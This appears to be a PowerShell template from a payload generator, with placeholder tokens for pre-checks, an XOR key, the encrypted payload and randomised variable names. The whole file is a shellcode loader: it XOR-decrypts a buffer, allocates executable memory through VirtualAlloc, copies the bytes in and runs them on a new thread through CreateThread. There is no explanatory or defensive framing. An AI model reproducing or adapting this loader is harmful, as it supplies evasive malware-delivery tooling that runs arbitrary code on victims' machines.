
{{PRE_CHECKS}}
{{V_KEY}} = [Convert]::FromBase64String("{{XOR_KEY_B64}}")
{{PAYLOAD_BLOCK}}

function {{FN_DECRYPT}}([byte[]]$data, [byte[]]$key) {
    $out = New-Object byte[] $data.Length
    for ($i=0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $out
}

{{V_BUF}} = {{FN_DECRYPT}} {{V_ENC}} {{V_KEY}}

# === Win32 API ===
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class W32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

{{V_PTR}} = [W32]::VirtualAlloc([IntPtr]::Zero, [uint32]{{V_BUF}}.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy({{V_BUF}}, 0, {{V_PTR}}, {{V_BUF}}.Length)
{{V_HT}} = [W32]::CreateThread([IntPtr]::Zero, 0, {{V_PTR}}, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[W32]::WaitForSingleObject({{V_HT}}, 0xFFFFFFFF)
